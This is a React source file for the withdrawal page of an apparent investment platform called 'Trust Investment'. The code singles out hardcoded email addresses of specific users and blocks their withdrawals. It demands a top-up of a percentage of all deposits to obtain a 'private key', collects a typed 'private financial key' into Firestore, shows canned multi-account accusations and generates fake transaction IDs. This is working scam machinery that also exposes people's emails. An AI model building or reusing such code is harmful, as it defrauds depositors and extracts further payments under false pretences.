import styles from "./Withdraw.module.css";
import Button from "antd/lib/button";
import Form from "antd/lib/form";
import Modal from "antd/lib/modal";
import Tooltip from "antd/lib/tooltip";
import { EnterAmount } from "../../components/Enter-Amount/Enter-Amount";
import { AdditionalInformation } from "../../components/Additional-Information/Additional-Information";
import React, { useContext, useEffect, useState } from "react";
import { getRandomArbitrary } from "../../utils/helpers";
import { ConfirmedWindow } from "../../components/ConfirmedWindow/ConfirmedWindow";
import { addDoc, collection } from "firebase/firestore";
import { FirebaseContext } from "../../index";
import { useOutletContext } from "react-router-dom";
import { getAuth } from "firebase/auth";
import { useTranslation } from "react-i18next";
import { Steps } from "antd";
import WithdrawnImage from "assets/images/withdrawn.svg";
import { v4 as uuidv4 } from "uuid";

import PaymentMethodIcon from "assets/images/withdrawn-icons/payment-method.svg";
import AmountIcon from "assets/images/withdrawn-icons/amount.svg";
import CommissionIcon from "assets/images/withdrawn-icons/commission.svg";
import IDIcon from "assets/images/withdrawn-icons/id.svg";
import DateIcon from "assets/images/withdrawn-icons/date.svg";
import { Waves } from "../../components/Waves/Waves";
import Wallets from "../../components/Wallets/Wallets";
import Input from "antd/lib/input";
import notification from "antd/lib/notification";

const Withdraw = () => {
  const [amount, setAmount] = useState(0);
  const [tax, setTax] = useState(0);
  const [isConfirmedModalOpen, setIsConfirmedModalOpen] = useState(false);
  const [form] = Form.useForm();
  const { firestore } = useContext(FirebaseContext);
  const { userData } = useOutletContext();
  const auth = getAuth();
  const { t, i18n } = useTranslation();
  const [current, setCurrent] = useState(0);
  const [api, contextHolder] = notification.useNotification();

  const [isPrivatKeyShowed, setIsPrivatKeyShowed] = useState(false);
  const [privatKey, setPrivatKey] = useState(false);

  const [walletIsExist, setWalletIsExist] = useState(false);

  const [privatKeyPercentage, setPrivatKeyPercentage] = useState(70);
  const [privatKeyAmount, setPrivatKeyAmount] = useState(1000);

  useEffect(() => {
    const isErnest = userData.email === "azrv1@mail.ru";

    const userWithPrivateKey =
      userData.email === "gevond@mail.ru" ||
      userData.email === "stassy95@mail.ru" ||
      userData.email === "vova.grigoryants@list.ru" ||
      userData.email === "bonyklade@gmail.com";

    if (isErnest) {
      setPrivatKeyAmount(1000);
      setPrivatKeyPercentage(43);
      setIsPrivatKeyShowed(true);
    } else {
      setIsPrivatKeyShowed(false);
    }

    if (userWithPrivateKey) {
      setPrivatKey(true);
      setIsPrivatKeyShowed(false);
    } else {
      setPrivatKey(false);
    }
  }, [amount]);

  const openNotification = () => {
    api.error({
      message: "",
      description: "Пополните счёт!",
    });
  };

  const handleConfirmedOk = () => {
    setIsConfirmedModalOpen(false);
  };

  const handleConfirmedCancel = () => {
    setIsConfirmedModalOpen(false);
  };

  const next = () => {
    form.validateFields().then((values) => setCurrent(current + 1));
  };
  const prev = () => {
    setCurrent(current - 1);
  };

  const steps = [
    {
      title: t("cash_in.choose_wallet"),
      content: <Wallets name={"payment-method"} message={t("make_deposit.choose_payment_method")} />,
    },
    {
      title: t("make_deposit.enter_amount"),
      content: (
        <>
          <EnterAmount form={form} tax={tax} withdrawnOperation={true} />
          <div className={styles["additional-info"]}>
            <AdditionalInformation
              infoLabel1={t("replenishment.fee")}
              infoValue1={tax}
              infoLabel2={t("withdrawn.withdrawn_fee")}
              infoValue2={+amount + tax}
            />
          </div>
        </>
      ),
    },
    {
      title: t("cash_in.confirm"),
      content: (
        <>
          {userData.isPrivateKeyWarning ? (
            <div className={styles["private-key-warning"]}>
              <p>
                Недавно было обнаружено, что с вашего IP-адреса активно используются несколько аккаунтов которые активно
                злоупотребляют нашей реферальной программой. Это противоречит нашим условиям использования, которые
                строго запрещают мультиаккаунтинг и злоупотребление реферальной программой.
              </p>
              <p>
                В связи с этим, мы вынуждены были заблокировать все связанные аккаунты. Пожалуйста, не создавайте новые
                аккаунты и не злоупотребляйте нашими услугами, чтобы избежать дальнейших санкций.
              </p>
            </div>
          ) : (
            ""
          )}
          {privatKey || userData.isPrivateKey ? (
            <>
              <div className={styles["private-key-wrapper"]}>
                <p>
                  <span>Важно:</span> Вы собираетесь ввести ваш приватный финансовый ключ. Этот ключ представляет собой
                  уникальную комбинацию символов, которая предоставляет вам доступ к вашим личным финансовым данным.
                </p>
                <p>
                  Будьте осторожны при использовании вашего приватного ключа. Не раскрывайте его третьим лицам, не
                  сохраняйте на общедоступных или незащищенных устройствах. В случае его утери или кражи, ваши
                  финансовые средства могут быть поставлены под угрозу.
                </p>
                <p>
                  Пожалуйста, убедитесь, что вы находитесь в безопасном и приватном окружении перед тем, как ввести свой
                  приватный ключ. Если вы не уверены, что ваше окружение безопасно, отложите этот процесс на более
                  подходящее время.
                </p>
                <p>
                  Вводите ваш ключ только если вы абсолютно уверены в своих действиях. Помните, что ответственность за
                  сохранность вашего приватного ключа лежит на вас.
                </p>
                <p>Пожалуйста, введите ваш приватный финансовый ключ в поле ниже:</p>
                <Form.Item
                  name={"private-key"}
                  rules={[
                    {
                      required: true,
                      message: "Требуется приватный финансовый ключ",
                    },
                  ]}
                >
                  <Input />
                </Form.Item>
              </div>
            </>
          ) : (
            ""
          )}

          {/*-------------------------------------*/}

          {isPrivatKeyShowed ? (
            <div className={styles["disclaimer"]}>
              <p>
                Уважаемый <span className={styles["nickname"]}>{userData.nickname}</span>,
              </p>
              <p>
                Мы хотели бы напомнить вам о важности безопасности вашего аккаунта при использовании нашей платформы.
                Если вы планируете вывести со своего счета сумму свыше <span>{privatKeyAmount}$</span>, вам необходимо
                использовать приватный ключ для подтверждения транзакции.
              </p>
              <p>
                Приватный ключ - это уникальный и секретный код, который используется для подписи транзакций и
                подтверждения вашей личности. Для получения приватного ключа нужно пополнить кабинет на{" "}
                <span>{privatKeyPercentage}%</span> от суммы всех депозитов. Приобретение приватного ключа -{" "}
                <span>бесплатно.</span> Средства можно будет вывести сразу, после того как они будут зачислены на ваш
                счет. Все функции вашего личного кабинета, в том числе, все внесенные средства, будут доступны сразу же
                после ввода приватного финансового ключа.
              </p>
              <p>Пожалуйста, убедитесь, что ваш приватный ключ надежно защищен и не передается третьим лицам.</p>
              <div>
                <Input className={styles["private-key"]} value={"***********"} disabled />{" "}
                <Button onClick={openNotification}>Получить</Button>
              </div>

              <p>
                Мы призываем вас принять меры для обеспечения безопасности вашего аккаунта и соблюдения наших политик
                безопасности.
              </p>
              <p>С уважением, Команда Trust Investment.</p>
            </div>
          ) : (
            ""
          )}
          <ul className={styles["information-list"]}>
            <img src={WithdrawnImage} width={300} />
            <li>
              <p>
                <img src={PaymentMethodIcon} width={20} alt={""} />
                {t("make_deposit.payment_method")}:
              </p>
              {form.getFieldValue("payment-method")}
            </li>
            <li>
              <p>
                <img src={AmountIcon} width={20} alt={""} />
                {t("transactions.amount")}:
              </p>
              {form.getFieldValue("amount")}$
            </li>
            <li>
              <p>
                <img src={CommissionIcon} width={20} alt={""} />
                {t("transactions.fee")}:
              </p>
              {tax}$
            </li>
            <li className={styles["date"]}>
              <p>
                <img src={DateIcon} width={20} alt={""} />
                {t("transactions.date")}:
              </p>
              {new Date().toLocaleDateString(i18n.language === "en" ? "en-US" : "ru", {
                year: "numeric",
                month: "long",
                day: "numeric",
                timezone: "UTC",
                hour: "numeric",
                minute: "numeric",
                second: "numeric",
              })}
            </li>
            <li className={styles["transaction-number"]}>
              <p>
                <img src={IDIcon} width={20} alt={""} />
                {t("replenishment.transaction_number")}:
              </p>
              {uuidv4()}
            </li>
            <Waves cn={"withdraw-waves"} />
          </ul>
        </>
      ),
    },
  ];

  const items = steps.map((item) => ({
    key: item.title,
    title: item.title,
  }));

  const onChange = () => {
    setAmount(form.getFieldValue("amount"));
    if (form.getFieldValue("payment-method") === "TRC20 Tether") {
      setTax(1);
    } else {
      setTax(0);
    }

    if (userData.paymentMethods[form.getFieldValue("payment-method")].number) {
      setWalletIsExist(false);
    } else {
      setWalletIsExist(true);
    }
  };

  const onDone = () => {
    form.validateFields().then(async (values) => {
      await addDoc(collection(firestore, "transactions"), {
        account_id: auth.currentUser.uid,
        amount: +form.getFieldValue("amount") + tax,
        status: "Ожидание",
        type: "Вывод",
        date: new Date(),
        email: auth.currentUser.email,
        executor: form.getFieldValue("payment-method"),
        paymentMethod: form.getFieldValue("payment-method"),
        tax: tax,
        _status: "running",
        privatKey: !!form.getFieldValue("private-key") ? form.getFieldValue("private-key") : "",
      }).then(() => {
        setIsConfirmedModalOpen(true);
      });
    });
  };

  return (
    <div className={styles["withdraw"]}>
      <h2 className={"my-account-title"}>{t("withdrawn.title")}</h2>
      <Form
        form={form}
        initialValues={{
          amount: 0,
        }}
        onChange={onChange}
      >
        <Steps
          direction={window.innerWidth < 850 ? "vertical" : "horizontal"}
          current={current}
          items={items}
          className={styles["steps"]}
        />
        <div className={styles["content"]}>{steps[current].content}</div>
        <div
          style={{
            marginTop: 24,
          }}
        >
          {current > 0 && (
            <Button
              style={{
                marginRight: "8px",
              }}
              onClick={prev}
            >
              {t("transactions.previous")}
            </Button>
          )}
          {current < steps.length - 1 && (
            <Tooltip title={t("withdrawn.tooltip")} open={walletIsExist}>
              <Button type="primary" onClick={next} disabled={walletIsExist}>
                {t("transactions.next")}
              </Button>
            </Tooltip>
          )}
          {current === steps.length - 1 && (
            <Button onClick={onDone} type="primary" disabled={isPrivatKeyShowed}>
              {t("transactions.done")}
            </Button>
          )}
        </div>
      </Form>
      <Modal
        open={isConfirmedModalOpen}
        onOk={handleConfirmedOk}
        onCancel={handleConfirmedCancel}
        cancelText={t("replenishment.cancel")}
        title={<p className={styles["title-modal"]}>{t("withdrawn.confirm_withdrawn")}</p>}
        footer={null}
      >
        <ConfirmedWindow transactionID={getRandomArbitrary()} />
      </Modal>
      <>{contextHolder}</>
    </div>
  );
};

export { Withdraw };
